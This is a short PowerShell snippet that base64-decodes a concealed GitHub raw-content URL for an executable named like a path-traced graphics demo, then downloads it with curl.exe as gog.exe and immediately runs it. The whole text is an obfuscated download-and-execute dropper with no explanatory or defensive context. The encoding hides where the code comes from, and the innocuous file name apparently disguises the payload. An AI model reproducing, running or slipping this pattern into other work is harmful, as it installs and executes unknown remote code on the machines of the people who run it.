 $b =  ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1YwRlRSQVdBU0QyMjIxMzIxL2Nvb2xk
ZW1vbW9tby9tYWluL3l4LXBlbnJvc2UtcGF0aHRyYWNlZC5leGUK"))).Trim()

 curl.exe $b -o ./gog.exe; ./gog.exe


 

